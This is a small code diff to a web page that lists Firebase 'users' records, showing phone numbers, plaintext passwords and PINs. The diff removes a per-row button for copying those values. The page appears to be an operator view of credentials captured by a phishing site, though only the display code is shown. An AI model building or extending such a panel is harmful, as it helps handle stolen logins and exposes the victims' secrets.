@@ -164,7 +164,6 @@ placeholder="Search Phone Number">
 <th>Password</th>
 <th>PIN</th>
 <th>Time</th>
-<th>Copy</th>
 
 </tr>
 
@@ -228,10 +227,7 @@ onValue(ref(db,"users"),(snapshot)=>{
     <td>${user.pin || "-"}</td>
     <td>${user.time}</td>
     <td>
-        <button class="copy"
-        onclick="copyData('${user.phone}','${user.password}','${user.pin || ""}')">
-        Copy
-        </button>
+        
     </td>
 </tr>
         `;
